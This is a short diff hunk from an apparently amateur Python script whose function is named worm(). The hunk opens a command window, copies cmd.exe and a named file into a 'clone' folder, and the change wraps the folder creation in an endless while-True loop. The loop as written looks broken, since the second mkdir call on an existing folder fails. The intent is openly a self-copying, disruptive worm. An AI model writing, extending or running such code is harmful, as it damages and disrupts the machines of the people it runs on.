@@ -29,9 +29,11 @@ def worm():
 
         
         os.system('start cmd')
-        os.mkdir('clone')
+        while True:
+                 os.mkdir('clone')
         os.system(r"copy cmd.exe clone")
         os.system(r"copy" + name + "clone")
+       
 
 
 
